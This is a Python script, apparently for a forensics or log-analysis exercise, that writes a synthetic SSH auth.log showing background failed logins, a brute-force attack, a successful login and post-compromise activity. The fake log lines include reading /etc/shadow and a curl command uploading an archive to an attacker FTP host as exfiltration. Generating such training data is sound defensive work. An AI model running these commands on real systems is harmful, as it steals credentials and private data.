import random
from datetime import datetime, timedelta

# IPs atacantes (una principal que logra entrar)
attacker_ip = "185.220.101.47"
noise_ips = ["45.33.32.156", "192.168.1.105", "103.21.244.0", "198.51.100.23"]
usernames = ["root", "admin", "ubuntu", "user", "test", "oracle", "postgres"]
valid_user = "deploy"
valid_ip = attacker_ip

from datetime import datetime, timedelta
import random

# Fecha de hoy, el ataque empezó ~2 horas atrás
start_time = datetime.now() - timedelta(hours=2)
logs = []

def fmt(dt):
    return dt.strftime("%b %d %H:%M:%S")

# Fase 1: Ruido de fondo - intentos de otras IPs
t = start_time
for _ in range(40):
    ip = random.choice(noise_ips)
    user = random.choice(usernames)
    logs.append(f"{fmt(t)} server01 sshd[1234]: Failed password for invalid user {user} from {ip} port {random.randint(40000,65000)} ssh2")
    t += timedelta(seconds=random.randint(60, 300))

# Fase 2: Ataque de fuerza bruta desde IP principal
t = start_time + timedelta(minutes=90)
for i in range(847):
    user = random.choice(usernames + [valid_user])
    logs.append(f"{fmt(t)} server01 sshd[2891]: Failed password for {user} from {attacker_ip} port {random.randint(40000,65000)} ssh2")
    t += timedelta(seconds=random.uniform(0.5, 3))

# Fase 3: Login exitoso
t = start_time + timedelta(hours=1, minutes=45)
logs.append(f"{fmt(t)} server01 sshd[2891]: Accepted password for {valid_user} from {valid_ip} port 52341 ssh2")
t += timedelta(seconds=5)

# Fase 4: Actividad post-compromiso
cmds = [
    "session opened for user deploy",
    "sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
    "sudo: deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/find / -name '*.conf'",
    "sudo: deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow",
    "sudo: deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/data.tar.gz /var/www/html/uploads",
    "sudo: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -T data.tar.gz ftp://185.220.101.47/exfil/",
    "session closed for user deploy",
]
for cmd in cmds:
    logs.append(f"{fmt(t)} server01 sshd[2891]: {cmd}")
    t += timedelta(seconds=random.randint(30, 120))

# Guardar
logs.sort()
with open("data/auth.log", "w") as f:
    f.write("\n".join(logs))

print(f"✅ Generados {len(logs)} líneas de log en data/auth.log")